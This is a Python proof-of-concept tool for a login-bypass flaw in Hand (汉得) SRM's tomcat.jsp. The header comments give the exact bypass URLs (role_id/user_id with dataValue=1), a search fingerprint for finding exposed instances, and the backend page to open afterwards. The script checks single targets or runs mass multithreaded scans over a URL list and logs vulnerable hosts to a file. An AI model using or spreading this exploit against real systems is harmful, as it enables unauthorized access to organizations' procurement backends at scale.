# 汉得 SRM tomcat.jsp 登录绕过漏洞
# /tomcat.jsp?dataName=role_id&dataValue=1
# /tomcat.jsp?dataName=user_id&dataValue=1
#web.body="汉得SRM" 
# 访问跳转后台 /main.screen
import requests,re,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               汉得 SRM tomcat.jsp 登录绕过漏洞░                                                     
"""
    print(banner)
def main():
    banner()#调用
    parser = argparse.ArgumentParser(description="汉得 SRM tomcat.jsp 登录绕过漏洞")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')#添加参数
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)#多线程
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/tomcat.jsp?dataName=role_id&dataValue=1'
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'42',
    }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        # match = re.search(r'"/login/login"',res.text)#正则匹配
        if res.status_code == 200 and "role_id" in res.text:
            print(f"[+]该{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在漏洞")
    except Exception as e:#异常处理
        print(f"[*]该url存在问题{target},请手动测试",e)

if __name__ == '__main__':
    main()